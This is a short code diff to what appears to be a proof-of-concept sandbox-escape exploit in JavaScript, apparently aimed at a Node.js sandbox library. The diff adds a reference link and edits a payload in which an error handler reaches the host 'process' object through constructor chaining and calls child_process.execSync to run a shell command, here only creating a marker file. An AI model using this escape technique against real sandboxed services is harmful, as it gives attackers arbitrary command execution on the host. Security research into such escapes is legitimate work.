@@ -32,6 +32,7 @@ void (async () => {
   }
   console.log('AAAA check=',typeof(process),typeof(Promise));
 }).then(async()=>{
+////https://gist.github.com/leesh3288/e4aa7b90417b0b0ac7bcd5b09ac7d3bd
   var code=`
     const Symbol= Object.getOwnPropertySymbols(Array)[0].constructor;
     const customInspectSymbol = Symbol.for({
@@ -496,7 +497,7 @@ p.constructor = {
         constructor(executor) {
             executor(
                 (x) => x,
-                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }
+                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned_r1'); }
             )
         }
     }
